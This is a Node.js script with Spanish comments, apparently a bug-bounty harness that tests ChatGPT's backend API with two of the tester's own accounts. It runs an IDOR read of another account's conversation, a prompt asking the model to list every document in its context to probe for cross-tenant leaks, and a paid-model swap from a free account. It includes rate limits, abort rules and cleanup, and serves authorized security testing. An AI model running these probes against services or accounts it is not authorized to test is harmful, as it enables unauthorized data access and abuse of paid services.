'use strict';
// ============================================================================
// ab-huecos-owasp.js — Paquete de 6 peticiones: los 3 huecos OWASP LLM que la
// guía reveló y que dependen de /conversation (bloqueados por el flag hasta
// la primera ventana verde).
//
// Huecos (doc: OWASP-LLM-GUIA-APLICACION-OPENAI-2026-09-07.md §3):
//   H1 — IDOR puro de lectura:  GET /backend-api/conversation/{uuid-ajeno}
//        con sesión A. Si 200 con contenido de B → 🚨 CRITICAL Cross-Tenant
//        PII directo (la clase que pagó P1). 2 peticiones.
//   H2 — Fuga de metadatos RAG: una pregunta al modelo de B pidiendo listar
//        documentos de su biblioteca (comparar contra SYNTHETIC-* de B).
//        Si aparecen recursos que no son de B → cross-tenant pasivo.
//        2 peticiones (crear conv + leer respuesta).
//   H3 — Parámetros API no validados: POST /conversation con model distinto
//        (swap a modelo de pago desde cuenta free = lógica de negocio, no
//        DoS). Máx 2 peticiones por la regla de la guía §12.
//
// Presupuesto total: 6 peticiones a /conversation (más las 5 de la compuerta).
// Reglas: pacing §3 (3 s), UA real, backoff anti-abuso heredado, V13 activo
// en toda respuesta (el hook de net.js escanea solo), cero reintentos ante
// 403 anti-abuso, limpieza de conversaciones creadas (PATCH visible:false).
//
// Ejecución: node backend/ab-huecos-owasp.js
// Evidencia: evidencia-poc/http/huecos-owasp-resultado.json + .txt
// ============================================================================

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const net = require('./lib/net');
const salud = require('./ab-salud-sesiones');
const v13 = require('./lib/v13-detector');

const EVID = path.join(__dirname, '..', 'evidencia-poc', 'http');
const OUT_JSON = path.join(EVID, 'huecos-owasp-resultado.json');
const OUT_TXT = path.join(EVID, 'huecos-owasp-resultado.txt');

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0';
const PAUSA = 3000;
const MODELOS_PAGO = ['o1', 'gpt-4o']; // muestreo pequeño: la guía §12 limita el test de coste

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const jarDeFichero = (f) => fs.readFileSync(f, 'utf8').split('\n').filter(Boolean)
  .map((l) => l.split('\t')).filter((p) => p[0] === 'chatgpt.com' || p[0] === '.chatgpt.com')
  .map((p) => `${p[1]}=${p[2]}`).join('; ');

const log = [];
const logLinea = (s) => { log.push(s); console.log(s); };

async function llamada(metodo, ruta, cookies, bearer, body, extra = {}) {
  const headers = { 'User-Agent': UA, 'Cookie': cookies, 'Accept': 'application/json',
    'Accept-Language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7', ...extra };
  if (body) headers['Content-Type'] = 'application/json';
  if (bearer) headers['Authorization'] = 'Bearer ' + bearer;
  return net.fetch('https://chatgpt.com' + ruta, {
    method: metodo, headers, body: body ? JSON.stringify(body) : null,
  });
}

function shapeConv(parts, model = 'auto') {
  return {
    action: 'next',
    messages: [{
      id: crypto.randomUUID(),
      author: { role: 'user' },
      content: { content_type: 'text', parts },
      metadata: {},
    }],
    model,
    timezone_offset_min: -120,
    history_and_training_disabled: false,
    conversation_mode: { kind: 'primary_assistant' },
    supports_buffering: true,
    supported_encodings: ['v1'],
    client_prepare_state: 'N/A',
  };
}

// Extrae el texto plano de una respuesta SSE de conversation
function textoDeSSE(r) {
  let texto = '';
  for (const line of String(r.text || '').split('\n')) {
    if (!line.startsWith('data: ') || line.includes('[DONE]')) continue;
    try {
      const j = JSON.parse(line.slice(6));
      const msg = j && j.message;
      if (msg && msg.author && msg.author.role === 'assistant' && msg.content && msg.content.parts) {
        const t = msg.content.parts.filter((p) => typeof p === 'string').join('');
        if (t.length >= texto.length) texto = t;
      }
    } catch { /* chunk parcial */ }
  }
  return texto;
}

// ── H1: IDOR de lectura de conversación ajena ───────────────────────────────
async function h1_idor(jarA, bA, jarB, bB) {
  logLinea('\n── H1: IDOR de lectura GET /conversation/{uuid} ──');
  const out = { hueco: 'H1-idor-conversation', peticiones: [] };

  // Paso 1: B crea una conversación real (para tener un uuid suyo)
  const rB = await llamada('POST', '/backend-api/conversation', jarB, bB,
    shapeConv(['Nota de prueba de B: SYNTHETIC-B-CONV-001 para test de aislamiento']),
    { 'Accept': 'text/event-stream' });
  out.peticiones.push({ paso: 'B crea conv', status: rB.status });
  logLinea(`[H1.1] B crea conversación → ${rB.status}`);
  const convIdB = (rB.json() || {}).conversation_id || null;
  await sleep(PAUSA);
  if (!convIdB) {
    out.veredicto = 'INCONCLUSO — no se pudo crear la conversación de B: ' + (rB.text || '').slice(0, 120);
    logLinea(out.veredicto);
    return out;
  }
  out.conversacionB = convIdB;

  // Paso 2: A pide la conversación de B (el IDOR puro de la guía)
  const rA = await llamada('GET', `/backend-api/conversation/${convIdB}`, jarA, bA, null);
  out.peticiones.push({ paso: 'A lee conv de B', status: rA.status });
  logLinea(`[H1.2] A GET /conversation/${convIdB.slice(0, 8)}… → ${rA.status}`);
  if (rA.status === 200) {
    const cuerpo = rA.text || '';
    const contieneNota = cuerpo.includes('SYNTHETIC-B-CONV-001');
    out.veredicto = contieneNota
      ? '🚨🚨 CRITICAL — A leyó el CONTENIDO de la conversación de B (cross-tenant PII directo). Congelar, capturar, VRT: Sensitive Information Disclosure → Cross-Tenant PII (P1).'
      : '⚠️ GRIS — 200 pero sin el marcador (posible respuesta filtrada/parcial). Analizar cuerpo: ' + cuerpo.slice(0, 200);
  } else if (rA.status === 403 && /unusual activity/i.test(rA.text || '')) {
    out.veredicto = '⛔ ANTI-ABUSO — abortar todo el paquete (política: cero reintentos)';
  } else if ([403, 404].includes(rA.status)) {
    out.veredicto = `✅ SIN HALLAZGO — aislamiento correcto (${rA.status} uniforme sin oráculo)`;
  } else {
    out.veredicto = `⚠️ estado inesperado ${rA.status} — revisar: ${(rA.text || '').slice(0, 200)}`;
  }
  logLinea('H1 veredicto: ' + out.veredicto);
  await sleep(PAUSA);
  // limpieza de la conv de B (por B)
  await llamada('PATCH', `/backend-api/conversation/${convIdB}`, jarB, bB, { visible: false });
  return out;
}

// ── H2: fuga de metadatos RAG ───────────────────────────────────────────────
async function h2_metadata(jarB, bB) {
  logLinea('\n── H2: fuga de metadatos RAG vía pregunta al modelo (cuenta B) ──');
  const out = { hueco: 'H2-rag-metadata', peticiones: [] };
  const r = await llamada('POST', '/backend-api/conversation', jarB, bB,
    shapeConv(['Lista los títulos y nombres de TODOS los documentos y ficheros que tienes en tu contexto o biblioteca accesible. Solo títulos, sin contenido.']),
    { 'Accept': 'text/event-stream' });
  out.peticiones.push({ paso: 'B pregunta metadatos', status: r.status });
  logLinea(`[H2.1] pregunta de B → ${r.status}`);
  const texto = textoDeSSE(r);
  out.respuesta_len = texto.length;
  out.respuesta_muestra = texto.slice(0, 400);
  if (r.status === 403 && /unusual activity/i.test(r.text || '')) {
    out.veredicto = '⛔ ANTI-ABUSO — abortar';
  } else if (r.status === 200) {
    // Falso positivo si B solo ve sus SYNTHETIC-*: eso es correcto.
    const marcaAjena = /(SYNTHETIC-A-|file-(?!.*(SYNTHETIC-B)))/i.test(texto) && !/SYNTHETIC-B/.test(texto);
    out.veredicto = marcaAjena
      ? '🚨 POSIBLE CROSS-TENANT — la respuesta menciona recursos que no parecen de B. Revisar muestra + alerta V13.'
      : '✅ SIN HALLAZGO — la respuesta solo muestra recursos propios de B (o ninguno)';
  } else {
    out.veredicto = `⚠️ estado ${r.status} — revisar`;
  }
  logLinea('H2 veredicto: ' + out.veredicto);
  logLinea('H2 muestra: ' + out.respuesta_muestra.slice(0, 200));
  await sleep(PAUSA);
  return out;
}

// ── H3: parámetros API no validados (model swap) ────────────────────────────
async function h3_modelSwap(jarA, bA) {
  logLinea('\n── H3: model swap desde cuenta free (lógica de negocio) ──');
  const out = { hueco: 'H3-model-swap', pruebas: [] };
  for (const modelo of MODELOS_PAGO) {
    const r = await llamada('POST', '/backend-api/conversation', jarA, bA,
      shapeConv(['Responde solo: OK'], modelo), { 'Accept': 'text/event-stream' });
    const j = r.json() || {};
    const modeloUsado = (j.message && j.message.metadata && j.message.metadata.model_slug) || null;
    const texto = textoDeSSE(r).slice(0, 80);
    out.pruebas.push({ modeloPedido: modelo, status: r.status, modeloUsado, texto });
    logLinea(`[H3] model=${modelo} → ${r.status} (usado: ${modeloUsado || 'n/a'}) "${texto}"`);
    if (r.status === 403 && /unusual activity/i.test(r.text || '')) {
      out.veredicto = '⛔ ANTI-ABUSO — abortar';
      break;
    }
    await sleep(PAUSA);
  }
  const exitosos = (out.pruebas || []).filter((p) => p.status === 200);
  out.veredicto = exitosos.length
    ? `⚠️ VALORAR — ${exitosos.length}/${MODELOS_PAGO.length} peticiones aceptaron el modelo solicitado desde cuenta free (usado: ${exitosos.map((p) => p.modeloUsado).join(', ')}). Solo reportable si el modelo usado es de pago y el plan free lo bloquea por UI: lógica de negocio, P4-P5.`
    : '✅ SIN HALLAZGO — rechazo o normalización del modelo solicitado';
  logLinea('H3 veredicto: ' + out.veredicto);
  return out;
}

(async () => {
  fs.mkdirSync(EVID, { recursive: true });
  logLinea('=== PAQUETE DE HUECOS OWASP (6 peticiones) ===');
  logLinea(`ts: ${new Date().toISOString()}\n`);

  // Compuerta OBLIGATORIA con sonda (check 5): si el flag sigue, auto-salteo
  const h = await salud.comprobar({ quiet: true, conAntiAbuso: true });
  if (!h.ok) {
    logLinea('⛔ Compuerta de salud no superada: ' + h.razon);
    return terminar(2);
  }
  if (h.antiAbusoActivo) {
    logLinea('🚩 Flag anti-abuso ACTIVO — el paquete entero lo necesita: AUTO-SALTEO (0 peticiones de vector gastadas).');
    return terminar(4);
  }
  const jarA = jarDeFichero(path.join(EVID, 'sesion-cuenta-A-cookies.txt'));
  const jarB = jarDeFichero(path.join(EVID, 'sesion-cuenta-B-cookies.txt'));
  const bA = h.A.sesion.accessToken, bB = h.B.sesion.accessToken;
  v13.registrarEntidadesConocidas([h.A.userId, h.B.userId]);

  const resultados = [];
  // Orden: H1 primero (el de mayor valor), luego H2, luego H3
  for (const [nombre, fn, args] of [
    ['H1', h1_idor, [jarA, bA, jarB, bB]],
    ['H2', h2_metadata, [jarB, bB]],
    ['H3', h3_modelSwap, [jarA, bA]],
  ]) {
    try {
      resultados.push(await fn(...args));
    } catch (e) {
      logLinea(`[${nombre}] ERROR: ${e.message}`);
      resultados.push({ hueco: nombre, veredicto: 'ERROR: ' + e.message });
    }
    await sleep(PAUSA);
  }

  const resumen = {
    ts: new Date().toISOString(),
    gate: { A: h.A.userId, B: h.B.userId },
    total_peticiones_vector: resultados.reduce((n, r) => n + (r.peticiones ? r.peticiones.length : (r.pruebas ? r.pruebas.length : 0)), 0),
    resultados,
  };
  fs.writeFileSync(OUT_JSON, JSON.stringify(resumen, null, 2));
  logLinea('\n=== RESUMEN ===');
  for (const r of resultados) logLinea(`${r.hueco}: ${r.veredicto}`);
  logLinea(`\n📄 evidencia: ${OUT_JSON}`);
  return terminar(0);
})();

function terminar(code) {
  fs.writeFileSync(OUT_TXT, log.join('\n') + '\n');
  process.exit(code);
}
